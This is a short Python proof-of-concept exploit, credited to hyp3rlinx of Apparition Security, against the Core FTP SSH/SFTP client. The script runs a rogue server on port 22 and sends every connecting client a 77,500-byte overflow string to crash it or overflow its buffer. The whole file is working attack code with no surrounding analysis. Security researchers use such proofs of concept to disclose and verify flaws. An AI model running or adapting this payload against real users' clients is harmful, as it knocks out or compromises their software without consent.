import socket

print 'hyp3rlinx - Apparition Security'
print 'Core FTP SSH/SFTP Remote Buffer Overflow / DOS\r\n'
host='127.0.0.1'

port = 22  
s = socket.socket()

payload="A"*77500
s.bind((host, port))            
s.listen(5)                    
 
print 'Listening on port... %i' %port
print 'Connect to me!'
 
while True:
    conn, addr = s.accept()
    conn.send(payload+'\r\n')
    conn.close()                                                                                            
